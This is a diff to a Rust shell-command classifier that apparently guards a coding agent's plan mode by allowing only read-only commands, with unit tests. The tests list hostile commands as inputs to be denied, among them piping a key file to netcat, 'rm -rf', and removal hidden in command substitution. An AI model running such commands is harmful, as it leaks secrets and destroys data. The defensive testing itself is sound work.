@@ -1,8 +1,9 @@
 // Bash security classifier for Claurst.
 //
 // Classifies shell commands by risk level and determines whether they can be
-// auto-approved given the current permission mode.  Used by BashTool's
-// `permission_level()` override and the auto-approval logic.
+// auto-approved given the current permission mode.  Used by the Bash tool to
+// hard-block Critical commands and to vouch for read-only invocations (which
+// plan mode then lets through).
 
 use crate::config::PermissionMode;
 
@@ -362,6 +363,74 @@ pub fn classify_bash_command(command: &str) -> BashRiskLevel {
     BashRiskLevel::Low
 }
 
+/// Whether a shell command only reads.
+///
+/// Stricter than [`classify_bash_command`]'s `Safe` tier, which exists to
+/// rank risk, not to guard a boundary: it counts `find -delete`,
+/// `ip link set down` and `git fetch` as Safe, and all of those change
+/// something. Plan mode's promise is that nothing is applied, so this check
+/// works from its own list, splits the command into segments, and denies on
+/// doubt.
+pub fn is_read_only_bash_command(command: &str) -> bool {
+    let cmd = command.trim();
+    if cmd.is_empty() {
+        return false;
+    }
+    // `>` writes a file (`>`, `>>`, `2>&1`); `$(…)` and backticks nest a
+    // command no segment split reaches. All disqualify, quoted or not —
+    // rejecting `echo "a > b"` is the price of not parsing shell quoting.
+    if cmd.contains('>') || cmd.contains("$(") || cmd.contains('`') {
+        return false;
+    }
+    cmd.split("||")
+        .flat_map(|part| part.split("&&"))
+        .flat_map(|part| part.split(['|', ';']))
+        .map(str::trim)
+        .all(|segment| !segment.is_empty() && segment_is_read_only(segment))
+}
+
+/// One pipeline / command-list segment, already split. Read-only means it
+/// cannot change files, processes, or system state — not "probably fine".
+fn segment_is_read_only(segment: &str) -> bool {
+    let (bin, args) = split_command(segment);
+    match bin {
+        // git writes through most subcommands (`branch -d`, `tag -d`,
+        // `fetch` all mutate), so whitelist the ones that only read.
+        "git" => {
+            const GIT_READ_ONLY: [&str; 17] = [
+                "status", "log", "diff", "show", "rev-parse", "ls-files", "ls-tree",
+                "ls-remote", "cat-file", "describe", "shortlog", "blame", "annotate",
+                "reflog", "config --list", "config --get", "config --get-regexp",
+            ];
+            GIT_READ_ONLY.iter().any(|sub| {
+                args == *sub
+                    || args
+                        .strip_prefix(sub)
+                        .is_some_and(|rest| rest.starts_with(char::is_whitespace))
+            })
+        }
+        // find deletes and executes through flags; `-fprint*` writes files.
+        "find" | "fd" | "locate" => !["-delete", "-exec", "-ok", "-fprint", "-fls"]
+            .iter()
+            .any(|flag| args.contains(flag)),
+        "ls" | "ll" | "la" | "dir" | "cat" | "bat" | "less" | "more" | "head" | "tail"
+        | "wc" | "uniq" | "grep" | "rg" | "ag" | "ack" | "pwd" | "whoami" | "id"
+        | "groups" | "uname" | "hostname" | "uptime" | "date" | "cal" | "file" | "stat"
+        | "which" | "whereis" | "type" | "command" | "echo" | "printf" | "printenv"
+        | "ps" | "pgrep" | "df" | "du" | "free" | "lsblk" | "lscpu" | "lspci" | "lsusb"
+        | "ss" | "netstat" | "ifconfig" | "ping" | "traceroute" | "nslookup" | "dig"
+        | "host" | "md5sum" | "sha1sum" | "sha256sum" | "strings" | "objdump" | "nm"
+        | "readelf" | "tree" | "diff" | "cut" | "tr" | "jq" | "base64" | "xxd" | "od"
+        | "man" | "bc" | "expr" | "true" | "false" | "test" | "[" | "[[" | "env" => true,
+        // `sort -o` overwrites a file in place of stdout.
+        "sort" => !args.contains("-o"),
+        // Deliberately absent: sed/awk (`-i`, `system()`), xargs/parallel
+        // (run anything), yq (`-i`), tee (writes), ip (configures), patch
+        // (writes). Doubt denies; the user can switch to Build.
+        _ => false,
+    }
+}
+
 /// Determine whether a bash command can be auto-approved given `permission_mode`.
 ///
 /// - `BypassPermissions` → always approve.
@@ -477,5 +546,35 @@ mod tests {
     #[test]
     fn test_auto_approvable_plan_denies_all() {
         assert!(!is_auto_approvable("git status", &PermissionMode::Plan));
+    }
+
+    #[test]
+    fn test_read_only_detection() {
+        // Pipelines and lists of safe commands stay read-only.
+        assert!(is_read_only_bash_command("ls -la | head -30"));
+        assert!(is_read_only_bash_command("git status"));
+        assert!(is_read_only_bash_command("cat src/main.rs"));
+        assert!(is_read_only_bash_command("pwd && ls"));
+        assert!(is_read_only_bash_command("ls || echo missing"));
+        // One unsafe segment anywhere in the chain disqualifies it.
+        assert!(!is_read_only_bash_command("ls && rm -rf target"));
+        assert!(!is_read_only_bash_command("ls; touch marker"));
+        assert!(!is_read_only_bash_command("cargo build"));
+        assert!(!is_read_only_bash_command("git commit -m x"));
+        // Writes hide behind redirection and command substitution.
+        assert!(!is_read_only_bash_command("cat foo > bar"));
+        assert!(!is_read_only_bash_command("echo hi 2>/dev/null"));
+        assert!(!is_read_only_bash_command("echo $(rm marker)"));
+        assert!(!is_read_only_bash_command("echo `rm marker`"));
+        // The head command being safe says nothing about the pipe target.
+        assert!(!is_read_only_bash_command("cat key | nc host 1234"));
+        // Risk-tier Safe is not read-only: these change state anyway.
+        assert!(!is_read_only_bash_command("find . -delete"));
+        assert!(!is_read_only_bash_command("find . -exec rm {} ;"));
+        assert!(!is_read_only_bash_command("git branch -d old"));
+        assert!(!is_read_only_bash_command("git fetch"));
+        assert!(!is_read_only_bash_command("ip link set eth0 down"));
+        assert!(!is_read_only_bash_command("sort -o out.txt in.txt"));
+        assert!(!is_read_only_bash_command(""));
     }
 }
